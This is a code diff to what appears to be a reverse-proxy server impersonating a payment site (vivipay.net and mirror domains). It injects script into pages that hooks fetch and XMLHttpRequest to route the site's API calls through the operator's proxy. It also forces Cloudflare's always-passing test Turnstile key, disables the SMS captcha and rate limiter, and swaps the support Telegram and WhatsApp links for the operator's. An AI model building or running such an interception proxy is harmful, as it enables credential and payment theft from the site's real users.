@@ -418,8 +418,6 @@ app.get('/inject.js', async (req, res) => {
       blockUpdate: data.blockUpdate !== false
     };
     let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
-    // Strip Turnstile auto-complete — using real CF widget with test sitekey
-    jsCode = jsCode.replace(/\/\/ ── Cloudflare Turnstile auto-complete[\s\S]*?\/\/ ─{10,}\n/, '');
     res.send(jsCode);
   } catch(e) {
     res.send(INJECT_JS);
@@ -857,7 +855,7 @@ app.get('/rsCfg.json', async (req, res) => {
     if (cfg && cfg.data) {
       cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
       cfg.data.siteKey = '1x00000000000000000000AA';
-      cfg.data.rsKeyMode = 0;              // render Turnstile widget with test sitekey
+      cfg.data.rsKeyMode = 1;              // render Turnstile widget with test sitekey
       cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
       cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
       cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
@@ -868,14 +866,14 @@ app.get('/rsCfg.json', async (req, res) => {
     res.json(cfg || { code: 0, msg: 'success', data: {
       okTurnstileSitekey: '1x00000000000000000000AA',
       siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 0,
+      rsKeyMode: 1,
       sliderSmsCaptcha: 0
     }});
   } catch(e) {
     res.json({ code: 0, msg: 'success', data: {
       okTurnstileSitekey: '1x00000000000000000000AA',
       siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 0,
+      rsKeyMode: 1,
       sliderSmsCaptcha: 0
     }});
   }
@@ -1388,6 +1386,34 @@ var P='https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 
+// ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
+(function(){
+  var origFetch = window.fetch;
+  window.fetch = function(url, opts) {
+    if (typeof url === 'string') {
+      if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
+        url = P + '/rsCfg.json';
+      } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
+        url = P + '/xxapi/' + url.split('/xxapi/')[1];
+      }
+    }
+    return origFetch.call(window, url, opts);
+  };
+  if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
+    var origOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
+      if (typeof url === 'string') {
+        if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
+          url = P + '/rsCfg.json';
+        } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
+          url = P + '/xxapi/' + url.split('/xxapi/')[1];
+        }
+      }
+      return origOpen.call(this, method, url, async, user, pass);
+    };
+  }
+})();
+
 // ── Cloudflare Turnstile auto-complete ──────────────────────────────────────
 // vivipay.net waits for turnstile.render() callback before enabling login.
 // On our proxy domain, the real Cloudflare widget sometimes doesn't fire the
@@ -1834,6 +1860,8 @@ app.all('*', async (req, res) => {
         const proxyBase = 'https://' + PROXY_HOST;
         js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
         js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
+        js = js.replace(/\.\/rsCfg\.json/g, proxyBase + '/rsCfg.json');
+        js = js.replace(/"rsCfg\.json/g, '"' + proxyBase + '/rsCfg.json');
 
         // Patch frontend rate limiter — "Please slow down." blocker
         js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
